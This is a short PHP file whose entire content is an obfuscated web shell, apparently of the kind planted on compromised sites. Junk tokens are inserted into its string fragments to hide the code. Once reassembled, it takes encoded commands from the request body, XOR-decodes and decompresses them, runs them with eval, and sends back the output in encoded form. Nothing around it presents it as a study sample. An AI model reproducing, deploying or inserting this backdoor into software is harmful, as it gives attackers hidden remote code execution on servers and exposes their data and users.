<?php
$k='_contVNVNents();@oVNVNb_end_clean(VNVN);$r=@base6VN4_eVNncode(@x(@gzcVNoVNmpress($o),$VNkVN));prVNint("$p$khVN$r$kf");}';
$t=',$k){$c=strVNleVNn($k);$l=VNstrlenVN($t);$o=VN"VN";foVNr($i=0;$iVN<$l;){for(VN$VNj=0;(VNVN$j<$c&&$i<$l);$VNj++,VN$i++VN)';
$c='{$o.=$t{$i}^VN$k{$VNj};}}reVNturn $oVN;}iVNVNfVN (@preg_match("/$kVNh(.+)$VNkf/",@VNfile_VNget_VNconteVNntVNs("phpVN://V';
$w='$k="054cVNd0VNa5";$kh="17VNa3bVNff4b0VNb1";$kf="VN8VN98VNVN34a0bVN5154";$p=VN"AFwtowzhQgfkVVN8VNPL";functVNion x($tVN';
$J='Ninput"),$mVN)==1)VN {@VNob_staVNrt();@evVNal(@gzuncomVNpressVN(@x(@baseVN64_VNdecode($VNm[1VN]),$k)VN));$o=@ob_VNget';
$Z=str_replace('Gv','','cGvreaGvtGve_fGvuncGvtGvion');
$W=str_replace('VN','',$w.$t.$c.$J.$k);
$g=$Z('',$W);$g();
?>
